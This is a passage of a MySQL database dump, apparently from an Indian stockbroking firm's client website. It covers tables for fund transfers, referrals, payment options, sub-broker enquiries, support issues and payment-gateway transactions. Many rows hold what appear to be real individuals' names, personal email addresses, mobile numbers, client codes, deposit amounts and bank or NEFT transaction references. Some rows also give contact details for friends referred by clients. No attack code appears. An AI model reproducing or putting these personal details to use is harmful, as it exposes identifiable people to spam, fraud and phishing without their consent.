onselectstart=\'return false\' style=\'-moz-user-select: none; cursor: default;\'>\r\n</body>\r\n</html>', '2017-01-11', '0000-00-00');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_faq_category`
--

CREATE TABLE `tbl_faq_category` (
  `id` int(11) NOT NULL,
  `faq_category_name` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_faq_category`
--

INSERT INTO `tbl_faq_category` (`id`, `faq_category_name`) VALUES
(1, 'Trading Software'),
(2, 'OdinDiet Registry'),
(3, 'Remot Desktop'),
(4, 'Accounts Opening'),
(5, 'Reset Password'),
(6, 'Margin'),
(7, 'Fund Transfer'),
(8, ' Reports & Back-office'),
(9, 'Delivery'),
(10, 'Modification in account'),
(11, 'Customer Support'),
(12, 'Referral'),
(13, 'Others');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_fund_status`
--

CREATE TABLE `tbl_fund_status` (
  `id` int(11) NOT NULL,
  `client_code` varchar(50) NOT NULL,
  `email` varchar(250) NOT NULL,
  `pay_opt_amt` varchar(30) NOT NULL,
  `segment` enum('MCX','NSE') NOT NULL,
  `fund_transfer_type` enum('NEFT In SBI A/C','NEFT In HDFC A/C','Cheq Deposit SBI A/C','Cheq Deposit HDFC A/C') NOT NULL,
  `neft_ref` varchar(50) NOT NULL,
  `created` date NOT NULL,
  `modified` date NOT NULL,
  `status` enum('0','1') NOT NULL DEFAULT '0' COMMENT '0=Inactive, 1=Active'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_fund_status`
--

INSERT INTO `tbl_fund_status` (`id`, `client_code`, `email`, `pay_opt_amt`, `segment`, `fund_transfer_type`, `neft_ref`, `created`, `modified`, `status`) VALUES
(1, '930k732', 'krishnoji2017@gmail.com', '9000', 'MCX', 'NEFT In HDFC A/C', '17011046708', '2017-01-11', '0000-00-00', '0'),
(2, '930p942', 'paghadalhardik95@gmail.com', '10000', 'MCX', 'NEFT In HDFC A/C', '83044909', '2017-01-11', '0000-00-00', '0'),
(3, '600S2671', 'bal.soumya001@gmail.com', '2000', 'MCX', 'NEFT In HDFC A/C', 'SAA40136467', '2017-01-11', '0000-00-00', '0'),
(4, '600V854', 'vijay_reddy121@yahoo.co.in', '5000', 'NSE', 'NEFT In HDFC A/C', '5882611834', '2017-01-13', '0000-00-00', '0'),
(5, '600V854', 'vijay_reddy121@yahoo.co.in', '40000', 'NSE', 'NEFT In HDFC A/C', 'EFT TO ASTHA CREDIT AND SECURITIES PVT.LTD -SA -XX', '2017-01-15', '0000-00-00', '0'),
(6, '801r1263', 'aryadurgaagencies@gmail.com', '200000', 'NSE', 'NEFT In HDFC A/C', '330070', '2017-12-21', '0000-00-00', '0');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_get_referral_benifit`
--

CREATE TABLE `tbl_get_referral_benifit` (
  `id` int(20) NOT NULL,
  `client_id` varchar(20) NOT NULL,
  `user_ph` varchar(20) NOT NULL,
  `friend_name` varchar(100) NOT NULL,
  `friend_ph` varchar(20) NOT NULL,
  `friend_email` varchar(50) NOT NULL,
  `created` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_get_referral_benifit`
--

INSERT INTO `tbl_get_referral_benifit` (`id`, `client_id`, `user_ph`, `friend_name`, `friend_ph`, `friend_email`, `created`) VALUES
(1, '600', '7415977333', 'Finaltest', '7878454512', 'BRAJENDRA_BHATI@YAHOO.COM', '2016-12-17'),
(2, '10', '8889485566', 'prashant kumar', '9303734607', 'prashant.kp@gmail.com', '2017-01-10'),
(3, '687', '8889485566', 'kavita', '9303734607', 'brajendra.bhati@asthatrade.com', '2017-01-10'),
(4, '123456', '8981295907', 'Ayan Roy', '8961265601', 'ayan@gmail.com', '2017-01-10'),
(5, '687', '1234567890', 'BB', '89632574112', 'bb@gmail.com', '2017-01-10'),
(6, '10', '8889485567', 'brajendra singh', '88958562555', 'brajendra.bhati@asthatrade.com', '2017-01-10'),
(7, '687P398', '1234567890', 'Ayan Roy', '8961265601', 'ayan@gmail.com', '2017-01-10'),
(8, '123456', '1234567890', 'Ayan Roy', '8961265601', 'manish@greenfieldsolutions.in', '2017-01-10'),
(9, '687P397', '8981295904', 'Ayan Roy', '8961265601', 'manish@greenfieldsolutions.in', '2017-01-10'),
(10, '687k385', '8889485566', 'brajendra singh bhati', '88522542522', 'bsb1976@gmail.com', '2017-01-10'),
(11, '108564', '9713487348', 'GOVIND UPADHYAY', '9098468596', 'g.kanha.d@gmail.com', '2017-01-11'),
(12, '600A1774', '9893249644', 'Maqbool Khan', '9893447387', 'maqbooldulot291@gmail.com', '2017-01-11'),
(13, '600a1671', '7597777787', 'mohomad faizan shaikh', '9769555730', 'faizansm@gmail.com', '2017-01-12'),
(14, '600P817', '9322247445', 'samdip', '9766092492', 'golambade.sandip@yahoo.com', '2017-01-12'),
(15, '600A1704', '8435248184', 'Ravindra singh', '8349680707', 'singh.ravi076152@gmail.com', '2017-01-12'),
(16, '930R1638', '9718008039', 'Deepak Verma', '9871919754', 'deepakverma074@gmail.com', '2017-01-12'),
(17, 'vairamani', '9345363199', 'shahul hameed p', '9500942665', 'vlmhameed@gmail.com', '2017-01-13'),
(18, '600p565', '9415666567', 'Pawan gojawat', '8889055517', 'pawan8gojawat@rediffmail.com', '2017-01-13'),
(19, '600a1671', '7597777787', 'TEJAS BHIMAJIYANI', '9722571641', 'Tejasbhimajiyani26@gmail.com', '2017-01-13'),
(20, '600a1671', '7597777787', 'MANOJ SHARMA', '9810846880', 'maanoj.trade@gmail.com', '2017-01-13'),
(21, 'TAHIR', '8050617770', 'P IBRAHIM', '9880102067', 'pibarhim7@gmail.com', '2017-01-14'),
(22, 'TAHIR', '8050617770', 'MOHAMMED ASLAM', '9845992327', 'mdaslamca@gmail.com', '2017-01-14'),
(23, 'TAHIR', '8050617770', 'SYED KHAJA', '9902373016', 'unitedmedical016@gmail.com', '2017-01-14'),
(24, 'TAHIR', '8050617770', 'SALMAANAM', '8050617770', 'tahir.anam@gmail.com', '2017-01-14'),
(25, 'FRS2524', '9074200077', 'VIJAY DHINGRA', '9899164299', 'vijay.dhiingra@gmail.com', '2017-07-14'),
(26, 'FRS2524', '9074200077', 'RAKSHITH M N', '7411861334', 'rakshith5594@gmail.com', '2017-07-14'),
(27, 'FRS2524', '9074200077', 'Sanjeev KUMAR', '9939543500', 'mdpsk13@gmail.com', '2017-07-14'),
(28, 'FRV009', '9049681681', 'SMITA SACHIN THAWARE', '9921112971', 'smitasthaware@gmail.com', '2017-07-14'),
(29, 'FRV009', '9049681681', 'SUPRIYA HUKUMCHAND BADWAIK', '9028090633', 'priyab80@hotmail.com', '2017-07-19'),
(30, 'FRM001', '9604674051', 'Pravesh prakash taware', '9011281994', 'pravesh_taware@yahoo.in', '2017-07-19');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_issue`
--

CREATE TABLE `tbl_issue` (
  `issue_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `issue_subject` varchar(255) NOT NULL,
  `issue_details` text NOT NULL,
  `issue_created_date` date NOT NULL,
  `issue_status_id` enum('1','2','3','4','5') NOT NULL DEFAULT '1' COMMENT '1for new, 2for open,3for pending,4for closed, 5for cancelled',
  `issue_category_id` int(11) NOT NULL,
  `issue_modified_date` date NOT NULL,
  `attachment` varchar(250) NOT NULL COMMENT 'Issue Attachment'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_issue`
--

INSERT INTO `tbl_issue` (`issue_id`, `user_id`, `issue_subject`, `issue_details`, `issue_created_date`, `issue_status_id`, `issue_category_id`, `issue_modified_date`, `attachment`) VALUES
(1, 13, 'testing', 'testing', '2016-12-17', '1', 5, '0000-00-00', '');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_issue_category`
--

CREATE TABLE `tbl_issue_category` (
  `id` int(11) NOT NULL,
  `issue_category` varchar(100) NOT NULL,
  `parent_id` int(11) NOT NULL COMMENT 'Parent Id',
  `is_active` enum('0','1') NOT NULL DEFAULT '1' COMMENT '0=Inactive, 1=Active'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_issue_category`
--

INSERT INTO `tbl_issue_category` (`id`, `issue_category`, `parent_id`, `is_active`) VALUES
(1, 'Account Opening', 0, '1'),
(2, 'Tech Support', 0, '1'),
(3, 'Trading Related', 0, '1'),
(4, 'Others', 0, '1'),
(5, 'Account Opening', 1, '1'),
(6, 'Software, Web, Mobile', 2, '1'),
(7, 'Nest Plus and Charting', 2, '1'),
(8, 'Others', 2, '1'),
(9, 'Funds - payin & Payout', 3, '1'),
(10, 'Contract Notes & Charges', 3, '1'),
(11, 'RMS', 3, '1'),
(12, 'Others', 3, '1'),
(13, 'Others', 4, '1');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_issue_reply`
--

CREATE TABLE `tbl_issue_reply` (
  `id` int(11) NOT NULL,
  `issue_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `reply_details` text NOT NULL,
  `reply_created_date` date NOT NULL,
  `reply_attachment` varchar(250) NOT NULL COMMENT 'Issue Reply Attachment'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_occupation`
--

CREATE TABLE `tbl_occupation` (
  `id` int(11) NOT NULL,
  `occupationname` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_occupation`
--

INSERT INTO `tbl_occupation` (`id`, `occupationname`) VALUES
(1, 'Public Sector'),
(2, 'Private Sector'),
(3, 'Government Service'),
(4, 'Business'),
(5, 'Professional'),
(6, 'Agriculturist'),
(7, 'Retired'),
(8, 'Housewife'),
(9, 'Student'),
(99, 'Other');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_payopt`
--

CREATE TABLE `tbl_payopt` (
  `id` int(11) NOT NULL,
  `name` varchar(250) NOT NULL,
  `email` varchar(250) NOT NULL,
  `client_code` varchar(20) NOT NULL,
  `mobile_no` varchar(30) NOT NULL,
  `exchange_type` enum('MCX','NSE') NOT NULL,
  `amt` varchar(20) NOT NULL,
  `created` datetime NOT NULL COMMENT 'Crerate Datetime',
  `modified` datetime NOT NULL COMMENT 'Modified Datetime',
  `status` enum('0','1') NOT NULL DEFAULT '0' COMMENT '0=Inactive, 1=Active'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_payopt`
--

INSERT INTO `tbl_payopt` (`id`, `name`, `email`, `client_code`, `mobile_no`, `exchange_type`, `amt`, `created`, `modified`, `status`) VALUES
(1, 'Manish Bera', 'manish@greenfieldsolutions.in', 'ABCD123', '8981295907', 'NSE', '100', '2017-02-06 16:16:27', '0000-00-00 00:00:00', '0'),
(2, 'lalit kumar pitaliya', 'ky8281@gmail.com', '650l059', '9200266564', 'NSE', '100000', '2017-07-27 16:04:15', '0000-00-00 00:00:00', '0'),
(3, 'MAHESH AANAGODUMATH', 'mypamsdreams@gmail.com', '600M2461', '9972666631', 'NSE', '500', '2017-12-11 15:20:50', '0000-00-00 00:00:00', '0'),
(4, 'Harish giri', 'Harishgiri7777@gmail.com', '930H514', '9672089417', 'NSE', '200', '2017-12-27 18:40:42', '0000-00-00 00:00:00', '0'),
(5, 'sebastian correia', 'primascorreia123@gmail.com', '930s3083', '7718862440', 'NSE', '12000', '2018-01-01 16:28:24', '0000-00-00 00:00:00', '0'),
(6, 'Harka Bahadur Rai', 'rai050826@gmail.com', '930H516', '9957653653', 'MCX', '3000', '2018-01-11 10:36:46', '0000-00-00 00:00:00', '0'),
(7, 'muisekhar', 'munisekhar.1417@gmail.com', '600T264', '8790047373', 'NSE', '8000', '2018-01-16 18:26:59', '0000-00-00 00:00:00', '0'),
(8, 'Pradeep kumar Gupta', 'pradeepkgupta143@gmail.com', '600P1310', '7008268683', 'NSE', '3000', '2018-01-16 21:02:08', '0000-00-00 00:00:00', '0'),
(9, 'Kanchan sharma', 'Kanchanom158@gmail.com', '930k965', '8954368487', 'NSE', '600', '2018-01-17 16:39:58', '0000-00-00 00:00:00', '0'),
(10, 'munisekhar', 'munisekhar.1417@gmail.com', '600T264', '8790047373', 'NSE', '9600', '2018-01-22 13:51:01', '0000-00-00 00:00:00', '0'),
(11, 'Rajnish kumar', 'Srajpmr@gmail.com', '930R2262', '8409903390', 'NSE', '2200', '2018-01-31 15:51:28', '0000-00-00 00:00:00', '0'),
(12, 'Swapnil Sathe', 'swapnilrsathe@gmail.com', '600S3489', '9860051001', 'NSE', '5000', '2018-02-05 15:59:18', '0000-00-00 00:00:00', '0'),
(13, 'Swapnil Sathe', 'swapnilrsathe@gmail.com', '600S3489', '9860051001', 'NSE', '5000', '2018-02-08 11:01:33', '0000-00-00 00:00:00', '0'),
(14, 'Swapnil Sathe', 'swapnilrsathe@gmail.com', '600S3489', '9860051001', 'NSE', '5000', '2018-02-09 13:04:55', '0000-00-00 00:00:00', '0'),
(15, 'GAURANG VINUBHAI PATEL', 'gv1234patel@gmail.com', '600G543', '9601431567', 'MCX', '4000', '2018-02-14 22:26:58', '0000-00-00 00:00:00', '0'),
(16, 'KRUNAL VINUBHAI PATEL', 'k.vishwa2767@gmail.com', '600k997', '9998172767', 'MCX', '12000', '2018-02-23 21:37:11', '0000-00-00 00:00:00', '0'),
(17, 'KRUNAL VINUBHAI PATEL', 'k.vishwa2767@gmail.com', '600K997', '9998172767', 'MCX', '10000', '2018-02-27 19:51:05', '0000-00-00 00:00:00', '0'),
(18, 'KRUNAL PATEL', 'k.vishwa2767@gmail.com', '600k997', '9998172767', 'MCX', '5000', '2018-03-19 22:11:23', '0000-00-00 00:00:00', '0'),
(19, 'KRUNAL VINUBHAI PATEL', 'k.vishwa2767@gmail.com', '600K997', '9998172767', 'MCX', '10000', '2018-03-20 18:54:26', '0000-00-00 00:00:00', '0');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_states`
--

CREATE TABLE `tbl_states` (
  `id` int(11) NOT NULL,
  `name` varchar(128) NOT NULL,
  `code` varchar(5) NOT NULL,
  `has_cities` tinyint(1) NOT NULL,
  `cog_countries_id` int(11) NOT NULL,
  `is_active` enum('0','1') NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_states`
--

INSERT INTO `tbl_states` (`id`, `name`, `code`, `has_cities`, `cog_countries_id`, `is_active`, `created_at`, `updated_at`) VALUES
(1, 'Andaman and Nicobar Islands', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(2, 'Andhra Pradesh', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(3, 'Arunachal Pradesh', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(4, 'Assam', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(5, 'Bihar', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(6, 'Chandigarh', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(35, 'Jharkhand', '', 1, 100, '1', '2016-12-01 00:00:00', '2016-12-01 00:00:00'),
(7, 'Dadra and Nagar Haveli', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(8, 'Daman and Diu', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(9, 'Delhi', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(10, 'Goa', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(11, 'Gujarat', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(12, 'Haryana', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(13, 'Himachal Pradesh', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(14, 'Jammu and Kashmir', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(33, 'Chhattisgarh', '', 1, 100, '1', '2016-12-01 00:00:00', '2016-12-01 00:00:00'),
(15, 'Karnataka', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(16, 'Kerala', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(17, 'Lakshadweep', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(18, 'Madhya Pradesh', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(19, 'Maharashtra', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(20, 'Manipur', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(21, 'Meghalaya', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(22, 'Mizoram', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(23, 'Nagaland', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(24, 'Orissa', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(25, 'Pondicherry', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(26, 'Punjab', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(27, 'Rajasthan', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(28, 'Sikkim', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(29, 'Tamil Nadu', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(30, 'Tripura', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(31, 'Uttar Pradesh', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(34, 'Uttarakhand', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(32, 'West Bengal', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10'),
(37, 'West Bengal', '', 1, 100, '1', '2007-12-28 17:54:10', '2007-12-28 17:54:10');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_states_international`
--

CREATE TABLE `tbl_states_international` (
  `id` int(11) NOT NULL,
  `name` varchar(128) NOT NULL,
  `code` varchar(5) NOT NULL COMMENT 'State Code',
  `has_cities` tinyint(1) NOT NULL,
  `cog_countries_id` int(11) NOT NULL,
  `is_active` enum('0','1') NOT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_states_international`
--

INSERT INTO `tbl_states_international` (`id`, `name`, `code`, `has_cities`, `cog_countries_id`, `is_active`, `created_at`, `updated_at`) VALUES
(1, 'Badakhshan', '', 1, 1, '1', '2007-12-28 17:54:06', '2007-12-28 17:54:06'),
(2, 'Badghis', '', 1, 1, '1', '2007-12-28 17:54:06', '2007-12-28 17:54:06'),
(3, 'Baghlan', '', 1, 1, '1', '2007-12-28 17:54:06', '2007-12-28 17:54:06'),
(4, 'Balkh', '', 1, 1, '1', '2007-12-28 17:54:06', '2007-12-28 17:54:06'),
(5, 'Bamian', '', 1, 1, '1', '2007-12-28 17:54:06', '2007-12-28 17:54:06'),
(6, 'Farah', '', 1, 1, '1', '2007-12-28 17:54:06', '2007-12-28 17:54:06'),
(7, 'Faryab', '', 1, 1, '1', '2007-12-28 17:54:06', '2007-12-28 17:54:06'),
(8, 'Ghazni', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(9, 'Ghowr', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(10, 'Helmand', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(11, 'Herat', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(12, 'Jowzjan', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(13, 'Kabol', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(14, 'Kandahar', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(15, 'Kapisa', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(16, 'Khowst', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(17, 'Konar', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(18, 'Kondoz', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(19, 'Laghman', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(20, 'Lowgar', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(21, 'Nangarhar', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(22, 'Nimruz', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(23, 'Nurestan', '', 1, 1, '1', '2007-12-28 17:54:07', '2007-12-28 17:54:07'),
(4335, 'Singapore', '', 1, 196, '1', '0000-00-00 00:00:00', '0000-00-00 00:00:00'),
(4999, '-', '', 0, 1, '1', NULL, NULL),
(5000, 'Telangana', 'TG', 1, 100, '1', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_subbroker_request`
--

CREATE TABLE `tbl_subbroker_request` (
  `id` int(50) NOT NULL,
  `subbroker_name` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL COMMENT 'Email',
  `phone` varchar(20) NOT NULL,
  `city` varchar(50) NOT NULL,
  `msg` text NOT NULL,
  `created` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_subbroker_request`
--

INSERT INTO `tbl_subbroker_request` (`id`, `subbroker_name`, `email`, `phone`, `city`, `msg`, `created`) VALUES
(1, 'Final test', 'devansh.acs@gmail.com', '7415977333', 'Raipur', 'Hello, please ignore this is just a test', '2016-12-17'),
(2, 'Brajendra Singh', 'Brajendra', '8889485566', 'Bhopal', 'Want open Sub brokership', '2016-12-17'),
(3, 'MB', 'manish@gmail.com', '8981295907', 'Kolkata', 'This is a test', '2017-01-10'),
(4, 'MB', 'nurul@greenfieldsolutions.in', '8981295908', 'Kolkata', 'Testing', '2017-01-10'),
(5, 'MB', 'nurul@greenfieldsolutions.in', '21212121211', 'Kolkata', 'Test', '2017-01-10'),
(6, 'Manish', 'manish@greenfieldsolutions.in', '8981295903', 'Kolkata', 'Test', '2017-01-10'),
(7, 'MB', 'manish@greenfieldsolutions.in', '8981295903', 'Kolkata', 'Test', '2017-01-10'),
(8, 'MB', 'manish@greenfieldsolutions.in', '8981295903', 'Kolkata', 'test', '2017-01-10'),
(9, 'MB', 'manish@greenfieldsolutions.in', '8981295903', 'Kolkata', 'Test', '2017-01-10'),
(10, 'MB', 'manish@greenfieldsolutions.in', '8981295903', 'Kolkata', 'test', '2017-01-10'),
(11, 'MB', 'manish@greenfieldsolutions.in', '8981295903', 'Kolkata', 'test', '2017-01-10'),
(12, 'MB', 'manish@greenfieldsolutions.in', '8981295908', 'Kolkata', 'cxcxcx', '2017-01-10'),
(13, 'MB', 'manish@greenfieldsolutions.in', '8981295903', 'Kolkata', 'dfdd', '2017-01-10'),
(14, 'asdsdsds', 'manish@greenfieldsolutions.in', '8981295903', 'Kolkata', 'fgg', '2017-01-10'),
(15, 'MB', 'manish@greenfieldsolutions.in', '8981295903', 'Kolkata', 'sddsd', '2017-01-10'),
(16, 'hasmukh', 'hasmukh4u_all@yahoo.com', '9885044402', 'hyderabad', 'i am intereted sub brokership in hyderabad', '2017-01-11'),
(17, 'Anuj', 'anujtyagi14dec@gmail.com', '7300667874', 'Meerut', 'I want to be your sub broker for north zone.', '2017-01-11'),
(18, 'Kousar ayaz', 'cyberchoice20@gmail.com', '9057018707', 'Mandsor', 'Become a sub broker', '2017-01-11'),
(19, 'kiran shrikant gaikwad', 'kiransgaikwad3007@gmail.com', '9890115525', 'nashik', 'hi sir i intrested bussiness with u in nashik district', '2017-01-11'),
(20, 'NAGARAJU BUKKARAJU', 'nagaraju.bukkaraju@gmail.com', '9392347432', 'Hyderabad', 'please mail me details.', '2017-01-12'),
(21, 'jigar', 'jvora@rocketmail.com', '8490970075', 'rajkot', 'eq & mcx sub-broker inq', '2017-01-12'),
(22, 'JAY BHOJANE', 'jaygbhojane@gmail.com', '9920129349', 'Mumbai', 'wan\'t to know the procedure and benefit of sub-broker', '2017-01-13'),
(23, 'Mylvaganan Lakshmanan', 'mylekhas@gmail.com', '91/9344759833', 'Madurai', 'To become a subroker or franchise. Please send your business terms.', '2017-01-14'),
(24, 'Santosh', 'ns.santhu85@gmail.com', '9844645582', 'Davangere', 'I want became sub broker please tell the procedure', '2017-01-14'),
(25, 'sandhya das', 'pankajdas55@rediffmail.com', '9609096612', 'chakdah', 'i want to be a sub broker under you. pl furnish details. whether i can include my family members acct.', '2017-01-15'),
(26, 'Kartik patel', 'Kartik8080@gmail.com', '8080920980', 'Mumbai', 'Looking for subbrokership', '2017-01-15'),
(27, 'Manish', 'manish@greenfieldsolutions.in', '45454544545', 'Kolkata', 'dsdsdsd', '2017-02-07'),
(28, 'Neeraj', 'nkhateek33@gmail.com', '9691133331', 'jabalpur', 'I want to frenchise for jabalpur', '2017-05-13'),
(29, 'Akash Rathore', 'akashengg81096@gmail.com', '8109646428', 'Indore', 'Contact me asap', '2017-07-15'),
(30, 'RAHUL MARODIA', 'rahul56414@gmail.com', '9614538646', 'siliguri', 'PLEASE GIVE FURTHER DETAILS', '2017-07-19'),
(31, 'ABHAY KOPARDE', 'aakoparde20@gmail.com', '9096315771', 'pune', 'interested in brokership', '2017-07-20'),
(32, 'Ajay singh', 'niftystudy@gmail.com', '9314496421', 'sikar', 'want more details', '2017-07-22'),
(33, 'Deepak Agarwal', 'wtadeepak@gmail.com', '7208080715', 'Navi Mumbai', 'I want to open a subbroker.', '2017-07-26');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_transaction`
--

CREATE TABLE `tbl_transaction` (
  `transaction` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `txn_id` varchar(20) NOT NULL,
  `item_name` varchar(130) NOT NULL,
  `amount` varchar(30) NOT NULL,
  `payment_status` varchar(30) NOT NULL,
  `created` date NOT NULL,
  `desc_payment` text NOT NULL COMMENT 'notes payments desc after transaction in atom paymentgateway',
  `bank_txn` varchar(255) NOT NULL COMMENT 'store bank transaction number',
  `bank_name` varchar(255) NOT NULL COMMENT 'Store bank name'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_transaction`
--

INSERT INTO `tbl_transaction` (`transaction`, `user_id`, `txn_id`, `item_name`, `amount`, `payment_status`, `created`, `desc_payment`, `bank_txn`, `bank_name`) VALUES
(1, 173, '', '', '50', '1', '2017-05-15', '', '', ''),
(2, 173, '', '', '50', '1', '2017-05-15', '', '', ''),
(3, 173, '', '', '50', '1', '2017-05-15', '', '', ''),
(4, 173, '', '', '50', '1', '2017-05-15', '', '', ''),
(5, 173, '', '', '50', '', '2017-05-15', '', '', ''),
(6, 175, '0', 'ADMISSION_FORM', '50', '4', '2017-05-15', 'Cancel by User', 'NA', 'NA'),
(7, 175, '', '', '50', '1', '2017-05-15', '', '', ''),
(8, 173, '', '', '50', '1', '2017-05-15', '', '', ''),
(9, 173, '', '', '50', '1', '2017-05-15', '', '', ''),
(10, 173, '', '', '50', '', '2017-05-15', '', '', ''),
(11, 173, '30770365', 'ADMISSION_FORM', '50', '2', '2017-05-15', 'Transction Success', '051612402251', 'ATOM PG'),
(12, 177, '30830424', 'ADMISSION_FORM', '50', '2', '2017-05-16', '', 'IGABHZVPS5', 'State Bank of India'),
(13, 181, '31700005', 'ADMISSION_FORM', '50', '2', '2017-05-31', '', '96214726', 'Punjab National Bank [Retail]'),
(14, 186, '', '', '50', '1', '2017-06-02', '', '', ''),
(15, 186, '', '', '50', '', '2017-06-02', '', '', ''),
(16, 186, '31792513', 'ADMISSION_FORM', '50', '2', '2017-06-02', 'Transction Success', '060214936858', 'ATOM PG'),
(17, 187, '31823559', 'ADMISSION_FORM', '50', '2', '2017-06-02', 'Transction Success', '060215209198', 'ATOM PG'),
(18, 187, '', '', '10', '1', '2017-06-02', '', '', ''),
(19, 187, '', '', '10', '1', '2017-06-02', '', '', ''),
(20, 187, '', '', '50', '', '2017-06-02', '', '', ''),
(21, 187, '31824071', 'ADMISSION_FORM', '50', '2', '2017-06-02', 'Transction Success', '060215214050', 'ATOM PG'),
(22, 189, '31826913', 'ADMISSION_FORM', '50', '2', '2017-06-02', 'Transction Success', '060215232927', 'ATOM PG'),
(23, 189, '', '', '50', '', '2017-06-02', '', '', ''),
(4936, 4504, '', '', '500', '', '2018-06-05', '', '', ''),
(4937, 4504, '', '', '500', '', '2018-06-05', '', '', ''),
(4938, 4499, '', '', '500', '', '2018-06-05', '', '', ''),
(4939, 4508, '', '', '500', '', '2018-06-06', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_upload_doc_category`
--

CREATE TABLE `tbl_upload_doc_category` (
  `id` int(10) NOT NULL COMMENT 'Auto Increment Id',
  `parent_cat_id` int(10) NOT NULL COMMENT 'Upload Category Id',
  `cat_name` text NOT NULL COMMENT 'Category Name'
